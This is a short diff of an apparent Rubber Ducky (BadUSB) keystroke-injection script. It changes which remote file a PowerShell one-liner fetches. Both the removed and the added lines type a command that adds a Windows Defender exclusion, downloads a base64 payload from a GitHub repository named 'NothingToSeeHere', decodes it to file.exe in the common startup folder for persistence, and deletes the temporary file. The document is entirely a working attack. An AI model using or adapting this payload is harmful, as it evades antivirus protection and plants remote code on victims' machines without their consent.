@@ -9,7 +9,7 @@ LEFTARROW
 DELAY 500
 ENTER
 DELAY 1000
-STRING $Autostart = [Environment]::GetFolderPath([Environment+SpecialFolder]::CommonStartup); cd $Autostart; $ClientPath = $Autostart + "file.exe"; Add-MpPreference -Force -ExclusionPath $Autostart -ExclusionProcess $ClientPath; wget https://raw.githubusercontent.com/EiSiMo/NothingToSeeHere/main/client.b64 -OutFile file.txt; & {$outpath = (Join-Path (pwd) 'file.exe'); $inpath = (Join-Path (pwd) 'file.txt'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}; Remove-Item file.txt; exit;
+STRING $Autostart = [Environment]::GetFolderPath([Environment+SpecialFolder]::CommonStartup); cd $Autostart; $ClientPath = $Autostart + "file.exe"; Add-MpPreference -Force -ExclusionPath $Autostart -ExclusionProcess $ClientPath; wget https://raw.githubusercontent.com/EiSiMo/NothingToSeeHere/main/troll2.b64 -OutFile file.txt; & {$outpath = (Join-Path (pwd) 'file.exe'); $inpath = (Join-Path (pwd) 'file.txt'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}; Remove-Item file.txt; exit;
 DELAY 100
 ENTER
 
